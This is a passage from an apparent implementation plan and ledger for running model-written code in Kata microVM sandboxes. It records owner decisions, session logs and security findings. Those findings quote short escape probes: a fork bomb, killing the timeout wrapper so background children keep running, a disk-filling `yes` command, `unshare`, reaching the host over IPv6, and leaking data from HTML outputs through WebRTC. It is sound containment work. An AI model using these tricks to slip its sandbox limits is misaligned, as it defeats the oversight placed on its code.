  only in memory and the startup sweep destroys leftover ephemeral
  sandboxes, so under `make backend`'s default `--reload` a temporary
  chat loses its workspace whenever the backend reloads. Saved chats are
  unaffected.
- **Q6 (found in review 2026-11-10). Answered 2026-11-10: (b), the
  parent chat's sandbox.** A background
  sub-agent runs in a chat of its own (`utils/subagents.py:463`), so
  under "one sandbox per chat" it gets its own `/workspace`, without the
  parent's files, and takes one of the 4 slots. Options: (a) its own
  sandbox; (b) the parent chat's sandbox (same files; the per-chat lock
  serializes their commands). Recommended: (b), since a delegated task
  usually continues the parent's work on the parent's files, and it does
  not double the slot use; T20 records whichever is chosen.
- **Q7 (found in T01, 2026-11-10). Answered 2026-11-10: upstream 4.3.1
  with runtime-rs.** Fedora 44's `kata-containers` 3.26.0 is QEMU-only
  (it requires `qemu-kvm-core`, ships one QEMU `configuration.toml`, and
  has no Cloud Hypervisor binary or `kata-clh` shim; Fedora has no
  `cloud-hypervisor` package), so it cannot run the proposal's design.
  Upstream had moved to 4.x: in 4.0.0 the runtime was rewritten in Rust
  (runtime-rs, the default) and the Go runtime deprecated (critical and
  CVE fixes only), and the 4.0.0 notes list Docker with runtime-rs as
  "only tested with QEMU". Options: (a) `kata-static-4.3.1` (runtime-rs);
  (b) `kata-go-static-4.3.1` (deprecated Go runtime); (c) 3.32.0, the
  last 3.x. Recommended and chosen: (a), so the home server is not built
  on a deprecated runtime; T02 proves Docker with Cloud Hypervisor on it,
  and if that fails the fallback is (b), recorded with the reason.
- **Q8 (found in T02, 2026-11-10). Answered 2026-11-10: (a), add
  `--ulimit nproc=512:512`.** `--pids-limit 512` is not enforced
  under Kata 4.3.1 runtime-rs. T14 passes both options, and the acceptance test "Fork bomb" checks the
  512 limit for UID 1000. With `--pids-limit 512`, the
  container's `pids.max` in the guest is `max`, and the sandbox's host
  cgroup has the host default (`pids.max` 76551). A fork bomb run with
  `docker exec` as UID 1000 reached 15,849 processes, stopped only by the
  guest kernel's own per-UID `RLIMIT_NPROC` (15,848, derived from the
  guest's 4 GiB); the host stayed responsive (load average 0.67) because
  the VM has 3 vCPUs and 4 GiB. Adding `--ulimit nproc=512:512` is
  honoured, including for `docker exec` processes: the same bomb stopped
  at 516 processes in the guest (512 for UID 1000 plus root and the
  agent), host load 0.46. Since every sandbox process runs as UID 1000 in
  its own VM, the per-UID limit acts as a per-sandbox limit. Options:
  (a) pass `--ulimit nproc=512:512` as well as `--pids-limit 512` (kept
  in case a later Kata enforces it), and the acceptance test checks 512
  processes for UID 1000; (b) accept the VM-bounded guest default (about
  15,800) and drop the 512 figure; (c) try the Go runtime (Q7's
  fallback) to see whether it enforces `--pids-limit`. Recommended: (a).
- **Q9 (found in T02, 2026-11-10). Answered 2026-11-10: (a), a fixed
  mirror address passed as `extra_hosts`.** Container names do not
  resolve inside a Kata guest. T16 fixes the subnet and the mirror's
  address in Compose; T14 passes the address as `extra_hosts`. Docker's embedded DNS answers on
  `127.0.0.11` only through iptables rules in the container's network
  namespace on the host; the guest's `/etc/resolv.conf` names
  `127.0.0.11`, but nothing in the VM answers there. On an
  `internal: true` network, a runc client resolves a peer by name and
  fetches from it; a `kata-clh` client cannot resolve it (`getent hosts`
  fails), but reaches it by IP, and with `--add-host <name>:<ip>`
  resolves it from `/etc/hosts` (which UID 1000 cannot change); no other
  name resolves. The fence itself holds: the host's LAN address,
  `docker0` and a public IP are "Network unreachable", and the guest's
  only route is the internal subnet. Options: (a) Compose gives the
  sandbox network a fixed subnet and `sandbox-mirror` a fixed address,
  and the manager passes `extra_hosts={'sandbox-mirror': <that address>}`
  from a constant, so the image's `PIP_FIND_LINKS=http://sandbox-mirror:8000/`
  keeps working; (b) the manager reads the mirror's current address with
  `docker inspect` when it creates each sandbox and passes it the same
  way (no fixed subnet, but a sandbox created before a mirror restart
  keeps a stale address); (c) run a DNS server on the sandbox network.
  Recommended: (a).
- **Q10 (found in T10's security review, 2026-11-10). Answered
  2026-11-10: (a), kill every UID 1000 process after every call.** May
  background processes outlive a call? T14 ends every `exec` with it.
  Backgrounded children survive `timeout` (T02), and a command can kill
  `timeout` itself so that its grandchildren keep running with no timeout
  at all (`( ... ) & kill -9 $PPID` returned 137 in 3 ms and the child
  wrote a file 4 s later). Options: (a) after every exec the backend
  kills every UID 1000 process in the sandbox (`kill -9 -1` as
  1000:1000), so nothing runs between calls and each call starts clean;
  (b) only after a timed-out exec and when the sandbox stops, so a model
  can start a long job in the background and poll it in later calls, at
  the cost of work running unseen between calls and holding the 4 GiB and
  2 CPUs while the chat is idle. Recommended: (a), which matches
  "one command at a time" and the "Timeout" acceptance test's "leaves no
  process behind".
- **Q11 (found in T10's security review, 2026-11-10). Answered
  2026-11-10: (a), a fixed-size 10 GiB filesystem per workspace.** Nothing
  bounds a sandbox's disk use. T14 builds the volume and proves it under
  Kata; `limits.WORKSPACE_SIZE` holds the size. Memory, CPUs and
  processes are bounded, but `yes > /workspace/f` fills the filesystem
  under Docker's data root, which on the laptop is `/` itself (btrfs,
  475 GB, 318 GB free, shared with `/home`, Postgres and Redis), and the
  proposal's limits table has no disk row. Options: (a) each workspace
  volume is a fixed-size filesystem (Docker's local volume driver mounting
  a sparse, loop-backed ext4 image, for example 10 GiB), a hard bound,
  to be proved under Kata in T14 before it is relied on; (b) a watchdog in
  the manager that stops a sandbox whose volume passes a size, which is
  reactive and can overshoot; (c) accept it on the laptop and revisit on
  the home server. Recommended: (a).
- **Q12 (found while building T11, 2026-11-10). Answered 2026-11-10:
  key unsaved chats by chat id and user.** Q5's ephemeral sandboxes were
  mapped from the chat id alone, so every member of a `channel:` chat
  would share one sandbox and its files, and anyone sending another
  user's `temporary:` id would reach that user's sandbox. Options: (a)
  map by (chat id, user id), so each user gets their own and
  `release(chat_id)` destroys every user's sandbox for that chat (the
  harness's case); (b) keep the chat id alone. Recommended and chosen:
  (a). Saved chats are unaffected: their read access is checked against
  the chat row.
- **Q13 (found in T11's security review, 2026-11-10). Answered
  2026-11-10: evict an idle sandbox, with a deadline.** When every slot
  is held, a waiting chat used to wait for the 30-minute reaper while
  holding its own lock, so four earlier chats could block a new one for
  half an hour. Now the manager stops the least-recently-used sandbox
  that is not in use and has been idle at least 60 seconds (its files stay
  on its volume) and takes its slot; with none to evict it waits at most
  2 minutes, then the call fails with "no free sandbox". Options were
  that, a per-user cap with the deadline, or the deadline alone.
- **Q14 (found in T11's security review, 2026-11-10). Answered
  2026-11-10: the owner or an admin.** A saved chat's sandbox is usable by
  its owner, or by an admin exactly as the chat completion endpoint
  allows, not by everyone who can read the chat (folder readers), since
  running code writes to the workspace the owner's model later uses.
- **Q15 (found in T11's security review, 2026-11-10). Answered
  2026-11-10: a per-user cap of 20 persistent workspaces, and a dialog
  before deleting one.** Each workspace is capped at 10 GiB (Q11), but
  nothing bounded how many a user holds within the 7-day retention. The
  owner chose: at most 20 persistent workspaces per user (admin-settable);
  before a workspace is deleted for the cap or for the 7-day expiry, the
  user sees a dialog listing its contents and chooses to remove or keep
  it; nothing is deleted without an answer (it stays pending, using its
  disk, until answered); a workspace whose chat was deleted still goes
  silently. The cap is hard: at the cap, the user either picks another
  workspace to remove, or the new workspace is not created and the model
  gets an error saying what happened. Built as T24.
- **Q16 (found while starting T14, 2026-11-11). Answered 2026-11-11:
  PID 1 as `nobody`, commands as UID 1000.** Q10's kill (`kill -9 -1` as
  UID 1000 after every call) stops a container whose PID 1 runs as UID
  1000 under tini, and without tini the killed processes stay as zombies
  against the 512-process limit (T14's notes). The proposal had PID 1 run
  as `1000:1000`. Options: (a) the container's user is `65534:65534`
  (`nobody`) with `init=True`, and every exec passes `user='1000:1000'`
  (checked on Kata with alpine: 150 calls, each leaving two background
  children, left the container up with 0 zombies); (b) PID 1 as root with
  every capability dropped; (c) PID 1 as UID 1000 running a reaper of our
  own that ignores the kill. Recommended and chosen: (a). T14 re-proves
  it on the real image.
- **Q17 (T16's first allowlist, 2026-11-11). Answered 2026-11-11:
  `polars`, `duckdb`, `pingouin`, `lifelines`.** The plan left the first
  packages to the owner, and with none T16's "Mirror installs" check
  cannot pass. Options: that data and statistics set; `tabulate` alone to
  prove the path; none. Chosen: the data and statistics set.
- **Q18 (found in T14, 2026-11-11). Answered 2026-11-11: a root setup
  step now.** Q11's fixed-size workspace cannot be built with Docker's
  local volume driver: `type=ext4, device=<image>, o=loop` fails on first
  mount with "loop: invalid argument" (Docker calls mount(2), and `loop`
  is a mount(8) feature). Without root, an ext4 image made by the
  backend's user can be attached with `udisksctl loop-setup` and given to
  Docker as the block device (checked under `kata-clh`: mounts, persists,
  `ENOSPC` at the size, clean removal), but polkit allows that only to a
  user with an active local login. Options: (a) rely on the login session
  and document a polkit rule for a headless server later; (b) add the
  root step now, a polkit rule granting the backend's user exactly the
  udisks2 loop actions it needs, so it works headless from the start;
  (c) a watchdog instead (Q11's option b); (d) no cap on the laptop.
  Chosen: (b); the rule is in `docs/guides/sandbox.md`, "Host setup".
- **Q19 (found in T14's security review, 2026-11-11). Answered
  2026-11-11: turn guest seccomp on.** Inside a Kata 4.3.1 runtime-rs
  guest no seccomp filter applies (`Seccomp: 0`), there is no Yama, and
  UID 1000 can create user namespaces (`unshare -U -r` works), so the guest
  kernel's whole syscall surface is reachable from model code and the VM is
  the only boundary against a guest-kernel bug. Options: (a) set
  `disable_guest_seccomp = false` in the runtime-rs Cloud Hypervisor
  configuration, so the agent applies Docker's default profile in the
  guest (blocks `unshare` and similar; a root edit at host setup); (b)
  leave it off and rely on the VM; (c) decide on the home server.
  Chosen: (a). Done on the laptop 2026-11-11 by `pkexec sed -i.orig`
  (original kept as `.orig`); a fresh sandbox shows `Seccomp_filters: 1`
  and `unshare -U -r` refused. It does not address the ptrace finding
  (T14 confirms the post-call kill from an exec as `nobody` instead).
- **Q20 (found in T16's security review, 2026-11-11). Answered
  2026-11-11: both layers.** With `inhibit_ipv4` the sandbox bridge has no
  IPv4 address, but it keeps an IPv6 link-local one, and the guest kernel
  has IPv6 on `eth0`: a probe sandbox reached a host listener on `::` (and
  KDE Connect's port 1716) through it. The guest-side fix is fixed
  `sysctls` disabling IPv6 in every sandbox (T14; guest root has no
  capabilities to undo it). Options: (a) that alone; (b) also a host-side
  backstop for a compromised guest kernel: the bridge is named
  `lllm-sandbox` and a udev rule (`/etc/udev/rules.d/90-local-llm-sandbox.rules`,
  a root step) disables IPv6 on it whenever Docker creates it. Chosen:
  (b), installed on the laptop 2026-11-11 by `pkexec`.
- **Q21 (found at the T13/T14/T16 push, 2026-11-11). Answered
  2026-11-11: list it and decide at T49.** `make pr-gate` reported that
  GitHub returned no diff for seven files ("too large"), so the tripwire
  could not inspect them; it fails closed on that, and it did not count
  the Q3 skip in `test_sandbox_uploads_kata.py`. Options: (a) list each
  such file under `## Gate changes` with a local grep of its added lines
  for every suppression the gate looks for, and the owner reviews them
  at T49; (b) stop and split the PR. Chosen: (a).
- **Q22 (found in T17's security review, 2026-11-11). Answered
  2026-11-11: 1 GiB per chat, a constant.** The per-call caps (20 files,
  200 MiB) bound one `bash` call, but nothing bounded a chat's sandbox
  outputs over many calls: a model looping on new files could fill the
  host's upload directory, which the database and the Docker volumes share.
  Options: (a) a fixed cap per chat in `sandbox/limits.py`; (b) an admin
  setting; (c) no total bound. Chosen: (a), `OUTPUT_CHAT_CAP_BYTES` = 1 GiB,
  counting the File rows the server marked as the chat's (`meta.source`
  and `meta.chat_id`), previews included, whether or not they are linked
  to a message (an unsaved chat's only when they are also the caller's);
  a file that would pass it is named as not attached (T17).
- **Q23 (found in T18's security review, 2026-11-11). Answered
  2026-11-11: accept and document.** A script in an HTML output can reach
  the network over WebRTC: an `RTCPeerConnection` to a STUN or TURN host
  it names sends data in the ICE traffic (a TURN username, or the host
  name itself through the DNS lookup), past the injected policy (CSP has
  no WebRTC directive), the `allow-scripts`-only sandbox and the desktop
  app's `will-frame-navigate` rule (Q4), which stops navigation only.
  Probed on Electron 45.1.0. It can leak what the model wrote, what the
  user types into the output, and the user's public IP. Options: (a)
  accept and document it; (b) render HTML outputs static first
  (`sandbox=""`) with a "Run this page's scripts" button that switches to
  `allow-scripts` on the user's consent; (c) delete `RTCPeerConnection`
  from the frame first (defeated by a fresh `about:blank` child frame).
  Chosen: (a); scripts keep running when the reply shows. T29's "output
  rendering" check includes an `RTCPeerConnection` probe.
- **Q24 (found in T12, raised for T20, 2026-11-12). Answered
  2026-11-12: (d), never both in one chat, and refuse the request.** An
  Open Terminal server's tools are added before the builtins, and
  `_add_builtin_tools` skips a name already present, so a chat with a
  terminal selected and engine `sandbox` got the terminal's `write_file`
  (writing on the terminal's machine) beside the sandbox's `bash`, `view`
  and `str_replace` (acting on `/workspace` in the microVM). Options: (a)
  the sandbox's `write_file` wins; (b) the terminal's wins, documented;
  (c) rename the sandbox's tools; (d) never offer both in one chat.
  Chosen: (d). A chat request that has a terminal selected while the code
  interpreter is on with engine `sandbox` is refused with an error asking
  the user to turn one of them off; nothing is guessed. Independently,
  `terminal_event_handler` emits `terminal:*` events only for terminal
  tools.
- **Q25 (from T17's code review, raised for T20, 2026-11-12). Answered
  2026-11-12: every path collects its own outputs.** The tag path, the Run
  endpoint and a sub-agent's `bash` calls collect `/workspace/outputs` the
  way `bash` does (the same comparison, the same per-sandbox listing, the
  same caps), so the next `bash` call does not attach them again. The tag
  path's outputs attach to the assistant message holding the block. The
  Run endpoint's outputs are shown under the code block and stored as the
  user's files, counted in the chat's 1 GiB, but not added to the saved
  message's files (pressing Run is the user's act, not part of the reply;
  they do not reappear after a reload). A sub-agent's outputs attach to the
  sub-agent's own message and count against the parent chat's cap, since
  the workspace is the parent's. Rejected: leaving collection to the next
  `bash` call, which attaches files late or, for a tag-path model that
  has no `bash` tool, never.

### Session log

One line per session, newest last:
`<date> | local or cloud | <tasks touched> | <what happened> | Next: <the exact next action>`

- 2026-11-10 | local | none | Plan written from the proposal and a fresh code inventory at `9ee7fc39`, reviewed by the project's `reviewer` agent; the owner answered Q1-Q6 as recommended. | Next: T00, from a local session, once the proposal PR (#883) has merged.
- 2026-11-10 | local | T00, T01, T02 | Branch and draft PR #884 opened (auto-merge off); OMC plan `sandbox` created per-story (26 goals, T01-T48); Kata 4.3.1 runtime-rs installed under `/opt/kata` and registered as `kata-clh` (root steps by `pkexec` after the owner's yes); the spike answered all eleven questions. Owner questions found and answered: Q7 (upstream 4.3.1 runtime-rs, Fedora's package is QEMU-only), Q8 (`--pids-limit` not enforced: add `--ulimit nproc=512:512`), Q9 (no name resolution in a Kata guest: fixed mirror address as `extra_hosts`); corrections 12-14 added; T13-T16 carry "From T02" notes. | Next: T10 (first `todo` row whose dependencies are met): `omc ultragoal complete-goals G003-t10 --plan-id sandbox`, then the owner types `/goal T10 per docs/plans/sandbox-implementation.md: every Verify item has evidence and the ledger row is done or needs-local-verify`.
- 2026-11-10 | local | T10 | Sandbox core built (`apps/server/local_llm/sandbox/`, 600 tests, 100% coverage) by an executor, tests by a separate test-engineer; security review and code review applied and re-reviewed (APPROVE); owner answered Q10 (kill every UID 1000 process after every call) and Q11 (fixed-size 10 GiB workspace); review consequences recorded as notes under T11-T20; checked on Kata that Q10's kill stops a tini-based container and that `sleep` as PID 1 leaves zombies (T14 must solve). | Next: T11 (`SandboxManager` lifecycle): `omc ultragoal complete-goals G004-t11 --plan-id sandbox`, then the owner types `/goal T11 per docs/plans/sandbox-implementation.md: every Verify item has evidence and the ledger row is done or needs-local-verify`.
- 2026-11-10 | local | T11 (and T24 added) | `SandboxManager` built by an executor, tests by a separate test-engineer; a security review and two code reviews applied (each found a real blocking bug: untracked VMs after a cancelled start; an unstoppable sandbox blocking eviction), final re-review APPROVE, fuzzers clean; owner answered Q12 (unsaved chats per chat and user), Q13 (evict an idle sandbox, 2-minute deadline), Q14 (owner or admin only) and Q15 (20 workspaces per user and a remove-or-keep dialog, which became the new task T24, gating T29); lifespan wiring moved from T11 to T14; OMC plan rebuilt from the ledger with T24 (23 goals). | Next: T12 (the four tools): `omc ultragoal complete-goals G001-t12 --plan-id sandbox`, then the owner types `/goal T12 per docs/plans/sandbox-implementation.md: every Verify item has evidence and the ledger row is done or needs-local-verify`.
- 2026-11-11 | local | T12-T19 | All eight done and pushed (commits in the ledger): the four tools with in-guest path confinement (T12), read-only chat uploads (T13), the Kata backend with PID 1 as `nobody`, udisks loop workspaces, guest seccomp and the network fence (T14), the data and web images (T15), the wheelhouse and `sandbox-mirror` (T16), outputs collected, stored and served (T17) and rendered on the reply with the desktop sub-frame rule (T18), and the engine settings, prompt and admin page (T19); every task's security and/or code reviews ended APPROVE and its Kata or laptop check is recorded. Owner answered Q16 (PID 1 `nobody`, commands as 1000), Q17 (allowlist: polars, duckdb, pingouin, lifelines), Q18 (fixed-size workspaces through udisks2 and a polkit rule), Q19 (guest seccomp on), Q20 (udev rule for the bridge's IPv6), Q21 (too-large diffs listed for T49), Q22 (1 GiB of outputs per chat) and Q23 (WebRTC from HTML outputs accepted and documented). Root steps run by `pkexec` after the owner's yes: the polkit rule, the Kata seccomp setting, the udev rule. `pip-audit` of the wheelhouse lock not run (blocked in this session). | Next: T20 (call sites; T12 and T19 are done), or T24, also unblocked. Rebuild the OMC plan from the ledger (its goals still show T12 in progress), then the owner types `/goal T20 per docs/plans/sandbox-implementation.md: every Verify item has evidence and the ledger row is done or needs-local-verify`.

---

## Requirement tags

Each task has an **Author** tag set (what writing the change needs) and a
**Verify** tag set (what proving it works needs). A session takes a task
only if it meets the Author tags; it sets `done` only if it also met every
Verify tag, and otherwise leaves `needs-local-verify` with the checks that
remain.

| Tag | Needs |
|---|---|
| `any` | a clone of the repo and the project's toolchains (uv, Bun, Node). No Docker, no KVM, no particular network |
| `docker` | a working Docker Engine the session may use |
| `kvm` | `/dev/kvm` and the Kata runtime registered as `kata-clh` (T01). In practice the laptop |
| `gpu` | the laptop's GPU and `llama-server`, for harness runs |
| `host-internet` | the host may reach PyPI, conda-forge, npm and CTAN (image builds, `make wheelhouse`) |
| `local` | must run in a local session for a non-hardware reason (the PR body, merging hand-off branches) |
| `owner` | the owner at the keyboard: `sudo`, firmware, a decision, an approval |

"any; docker, kvm" in the Verify column means: most checks run anywhere,
and the listed tags are needed for the rest. The task's Verify list marks
which checks need which tags.

## Ground rules for every task

- **One task, one commit**, with the ledger row updated in that commit.
  Conventional message, no attribution (AGENTS.md, "Commit policy").
- **Docs in the same commit** as the behaviour they describe (AGENTS.md,
  "Maintenance policy"); T23 and T44 are sweeps, not the only doc work.
- **One `docs/decisions.md` entry for the whole PR.** The proposal PR
  added the 2026-11-10 entry (proposed, nothing built). This PR adds one
  new dated entry at the top, written in T23 and kept current as tasks
  land: what was built, and every way the build differs from the
  proposal (start with "Corrections to the proposal" below). Never edit
  the 2026-11-10 entry or any other existing entry.
- **Append-only schema.** New Alembic revisions only, written with the
  `new-migration` skill. The head at `9ee7fc39` is `e3a7c5f92b18`; check
  again before writing a revision, since `main` moves.
- **Security-marked tasks** (marked **security** in their heading) get a
  separate security review before their commit: the boundary is only as
  good as its least-reviewed piece.
- **Never build Docker options from model or user strings.** The manager
  passes fixed options, a validated image key (`data` or `web`), and a
  chat id it has checked against the database. Model strings go only into
  `exec` argument lists, never into container, volume, network or mount
  options, and never through a shell on the host.
- **No placeholder work.** No `TODO` stubs, no `test.skip`/`.only`, no
  stub tests. A piece that cannot be finished is split off as a new ledger
  row.
- **Diff coverage holds in CI.** `make test-backend` and CI run
  diff-cover at 80% over the whole PR's changed lines, and `# pragma: no
  cover` is a gate finding. Code that only runs against real Docker or
  Kata (T14, parts of T16, T17, T21) is therefore covered in CI by
  unit tests against a mocked Docker SDK client, method by method, and
  the `LLLM_TEST_KATA` tests prove it against the real thing on the
  laptop.

## Corrections to the proposal

Found by the inventory of 2026-11-10. Each is reflected in the tasks below
and goes into this PR's decisions entry.

1. **Config defaults are not seeded by Alembic** (the proposal said they
   were; it was corrected before it merged). New keys go in
   `DEFAULT_CONFIG` (`config.py:2599`); `seed_registered_defaults()`
   (`config.py:34-37`, called from `main.py:391`) inserts missing keys at
   every start. Only changing existing rows (T43) needs a revision.
2. **The Run button is not shown today** (Q2).
3. **Assistant message files are never displayed.** `ResponseMessage` in
   `routes/chat/ChatMessages.tsx` renders neither `message.files` nor
   `embeds`, and the code interpreter's `output` is stored on the token
   (`lib/chat/structuredOutput.ts:252-268`) but never read. Showing
   outputs (T18) is new frontend work, not a change to an existing view.
4. **`GET /api/v1/files/{id}/content/html` serves HTML on the app's
   origin** with no `Content-Disposition` (`routers/files.py:918-964`;
   `FileResponse` guesses `text/html` from the path, so it renders), for files whose owner is an admin. The
   owner is an admin, so a sandbox output stored as an ordinary file could
   be opened there as a page on the app's origin. T17 makes that endpoint
   refuse sandbox outputs. Likewise `GET /{id}/content` serves PDFs
   `inline` (`files.py:889-891`); T17 forces `attachment` and `nosniff`
   for sandbox outputs.
5. **The harness's failure guard depends on `note_code_run`**
   (`utils/upstream_trace.py:65`), which only `execute_code_jupyter`
   calls. The sandbox engine must call it (T20), or a broken sandbox
   would let harness runs score failures as model errors.
6. **Chat deletion has many paths** (the two chat routes, folders, notes,
   user purge), with no common hook above the models. Rather than hooking
   each, the retention sweep (T11) also removes every sandbox volume
   whose chat no longer exists.
7. **Background sub-agents** keep the code interpreter only when the
   engine is `jupyter` (`utils/subagents.py:303-320`); the sandbox needs
   no browser either, so it joins that branch (T20).
8. **A name already in use:** `view_file` is an existing chat-file tool
   (`tools/builtin.py:2838`). The new tools are `bash`, `view`,
   `write_file` and `str_replace`; check the tool spec names stay unique.
9. **The navigation gap in the HTML policy** (Q4).
10. **Unsaved chats and sub-agents** (Q5, Q6).
11. **`_gated_tools` cannot select by engine** (`utils/tools.py:629-651`):
    it gates on config, capability, feature and permission only. T12
    replaces the code interpreter's entry with a custom selector.
12. **Kata is 4.3.1 with runtime-rs, from upstream** (Q7, found in T01).
    The proposal's Migration step 1 offers Fedora's packages and
    `kata-runtime check`; Fedora 44's package is QEMU-only, the check is
    `kata-ctl check` under runtime-rs, and Cloud Hypervisor is selected
    with the `ConfigPath` runtime option in `daemon.json`, since 4.3's
    runtime-rs rejects a non-default `KATA_CONF_FILE`
    (`docs/guides/sandbox.md`, "Host setup").
13. **`--pids-limit` is not enforced under Kata 4.3.1** (Q8, found in
    T02); the process limit is `--ulimit nproc=512:512`, which caps UID
    1000 at 512 processes in the guest.
14. **No container name resolves inside a Kata guest** (Q9, found in
    T02), including `sandbox-mirror`; the mirror has a fixed address,
    passed to each sandbox as `extra_hosts`.
15. **Commands run as `/usr/bin/timeout --kill-after=5 <t> /bin/bash -lc
    -- <command>`** (T10's security review), not `timeout ... bash -lc
    <command>`: absolute paths so a file on `PATH` cannot replace them,
    and `--` so a command starting with `-` is not read as an option.
    A command with a NUL byte or over 100,000 bytes is refused before it
    runs.
16. **Nothing runs between calls** (Q10) and **each workspace is a
    fixed-size 10 GiB filesystem** (Q11); the proposal's limits had no
    disk bound.
17. **An `internal: true` Docker network does not fence the host by
    itself** (found in T14, 2026-11-11): the bridge keeps an IPv4
    address on the sandbox subnet (the gateway, or the ip_range's first
    address), and a sandbox reaches any host listener bound to `0.0.0.0`
    through it (the backend in LAN mode, `llama-server`). The sandbox
    network also sets `com.docker.network.bridge.inhibit_ipv4: "true"`,
    so the bridge has no IPv4 address, and the backend refuses a network
    without it. T02's fence check had tested only the host's LAN address,
    `docker0` and a public address.
18. **Guest seccomp is on** (Q19) and **the workspace volume is a loop
    device attached through udisks2** under a polkit rule (Q18), both
    root steps at host setup that the proposal did not have; and the
    sandbox's first process runs as `nobody` (Q16).

## Expected PR gate findings

The PR will trip the gate; the local session lists every finding under
`## Gate changes` in the PR body with its justification. Known in advance:

| Finding | Task | Why it is needed and does not weaken CI |
|---|---|---|
| `Makefile` changed | T15, T16, T41 | New lifecycle targets (`sandbox-images`, `wheelhouse`), the `sandbox-mirror` service in `make backend`'s service list, Jupyter's removal. No check target changes meaning |
| New `pytest.skip(` in the Kata tests | T14, T13 (`test_sandbox_uploads_kata.py`), T17 (`test_sandbox_outputs_kata.py`) | KVM is unavailable on hosted runners (Q3); the tests run on the laptop and their results are recorded in the PR |
| Deleted test files `test_jupyter_chat_files.py`, `test_jupyter_idle_timeout.py`; fewer test definitions | T40 | The code they test is deleted; the sandbox's own tests (T10-T21) cover the replacement behaviour, including the `chat_files()` checks moved into `sandbox/uploads.py` |
| Edited golden files `tests/fixtures/chat_payload.json`, `streaming_response.json`, `subagent_delegate.json` | T40, T42 | Their Jupyter and Pyodide cases describe engines that no longer exist; the replacement cases record the sandbox engine's payloads |
| Fewer tests in `test_makefile.py`, `progress.test.ts` (if a Jupyter-only case goes) | T41 | Same reason; the service-list assertions are rewritten, not dropped |
| Fewer tests in `CodeExecution.test.tsx` and `e2e/admin-settings.spec.ts` (`:187-222`) | T42 | The Jupyter and Pyodide engine choices are removed; the sandbox cases from T19 remain |
| A file whose diff GitHub did not return ("too large"), so the gate could not inspect it | T12-T19 (Q21) | The PR outgrew GitHub's per-file diff limit in its API; the gate fails closed on such files. Each is listed under `## Gate changes`, with a local grep of its added lines for skip, xfail, `.only`, `noqa`, `type: ignore`, `biome-ignore`, `@ts-expect-error` and `pragma` (none but the Q3 Kata skips), and the owner reviews them at T49 |
| Edited golden file `tests/fixtures/tool_loading.json` | T12 | It records the `Config.get_many` key list in `get_builtin_tools` and the offered tools (around `:1910-1925`); adding the engine key and the sandbox tools changes it. The test still checks the same thing, against the new list |

If a task produces a finding not listed here, add a row in the same commit
**and** add it to the "Open" list in "Owner questions": AGENTS.md's tripwire rule is to
stop and ask the owner about every finding, and a finding nobody expected
is the one most worth asking about.
Avoid needless ones: no `conftest.py` edits, no new `package.json`
scripts, no `.gitignore` edits (the wheelhouse lives under the ignored
`apps/server/data/`).

---

## Step 1: add the sandbox engine

### T00: open the branch and the draft PR

*Author: local. Verify: local. Depends: the proposal PR (#883) merged.*

1. From an up-to-date `main`: `git switch -c feat/sandbox-code-interpreter`.
2. Make the first commit the ledger change: T00 `in-progress` and
   "`main` last merged in at" `<sha of main>`. Message:
   `docs(plans): start the sandbox implementation ledger`.
3. Push and open the PR **as a draft**:
   ```sh
   git push -u origin feat/sandbox-code-interpreter
   gh pr create --draft --base main \
     --title "feat(sandbox): replace the Jupyter and Pyodide code interpreters with per-chat microVM sandboxes" \
     --body-file <scratchpad>/pr-body.md
   ```
   The body follows the local session plan's "Pull request body".
4. Record the PR number in the ledger header and set T00 `done`, commit,
   push.

**Verify:** `gh pr view <PR> --json isDraft,autoMergeRequest` shows
`isDraft: true` and no auto-merge; `make pr-gate PR=<PR>` runs.

### T01: install and register Kata on the laptop

*Author: owner, kvm. Verify: owner, kvm. Depends: T00.*

The owner runs the root steps; the agent prepares the commands, shows
them, asks, and records the results. On the laptop root commands go
through `pkexec`, not `sudo`, which has no TTY in an agent session.

Corrected 2026-11-10 from what worked (Q7); the first version of this
task assumed Fedora's package or a 3.x release, the Go runtime's
`kata-runtime check`, and a `runtimeType` naming a per-hypervisor shim.

1. Check virtualization: `grep -cE 'vmx|svm' /proc/cpuinfo` (non-zero),
   `ls -l /dev/kvm`.
2. Install Kata Containers: the upstream static release 4.3.1 with
   runtime-rs (`kata-static-4.3.1-amd64.tar.zst` and
   `kata-tools-static-4.3.1-amd64.tar.zst`), checksum-verified, unpacked
   under `/opt/kata` by extracting only `./opt/kata` (the tarballs' `./`
   entry would change the mode of `/`). Fedora 44's package is QEMU-only.
3. Register the runtime in `/etc/docker/daemon.json` (merge with what is
   there; show the owner the diff first), selecting Cloud Hypervisor
   with the `ConfigPath` runtime option:
   ```json
   {"runtimes": {"kata-clh": {
     "runtimeType": "/opt/kata/runtime-rs/bin/containerd-shim-kata-v2",
     "options": {"ConfigPath": "/opt/kata/share/defaults/kata-containers/runtime-rs/configuration-clh-runtime-rs.toml"}}}}
   ```
   A wrapper shim setting `KATA_CONF_FILE` does not work on 4.3: runtime-rs
   rejects any value that is not a default configuration path. Restart
   Docker.
4. `sudo /opt/kata/bin/kata-ctl check no-network-checks` exits 0.
5. Smoke: `docker run --rm --runtime kata-clh alpine uname -r` prints a
   kernel different from `uname -r` on the host, and a `cloud-hypervisor`
   process runs on the host while such a container does.

**Docs:** start `docs/guides/sandbox.md` with a "Host setup" section:
the commands that worked, the versions, and how to check them. Link it
from `docs/guides/` in MAP.md.

**Verify:** steps 4 and 5 outputs in the ledger evidence, with Kata,
Cloud Hypervisor (`cloud-hypervisor --version`) and Docker versions.

### T02: spike, prove the Kata assumptions

*Author: docker, kvm. Verify: docker, kvm. Depends: T01.*

A throwaway script in the scratchpad (not committed) that answers each
question below with a command and its output. Record every answer in the
ledger row and in `docs/guides/sandbox.md`'s "Host setup" where it
matters. If any answer is "no", stop and add an owner question before T14
or T15 proceeds; these are the proposal's load-bearing assumptions.

1. A named volume mounted at `/workspace` under `--runtime kata-clh`
   works (virtio-fs), keeps files across container removal, and a
   directory owned by UID 1000 in the image keeps that ownership when the
   empty volume is first mounted.
2. `--read-only` root with `--tmpfs /tmp:size=256m` works under Kata.
3. `--user 1000:1000 --cap-drop ALL --security-opt no-new-privileges
   --memory 4g --cpus 2 --pids-limit 512` are honoured: check
   `/sys/fs/cgroup` limits inside, a fork bomb stops at the PID limit, a
   6 GB allocation is OOM-killed inside the guest.
4. A user-defined network with `internal: true` attaches under Kata;
   from inside, a second container on that network resolves by name and
   nothing else resolves or routes (`getent hosts postgres`, `curl
   https://pypi.org`).
5. `put_archive` and `get_archive` (Docker SDK, or `docker cp`) work
   against a running Kata container, and files written by `put_archive`
   are owned by root with the modes in the tar headers.
6. `docker exec` with a list argv and `--user 1000:1000` works and
   streams output.
7. `quay.io/jupyter/scipy-notebook:2026-10-12`'s Python honours
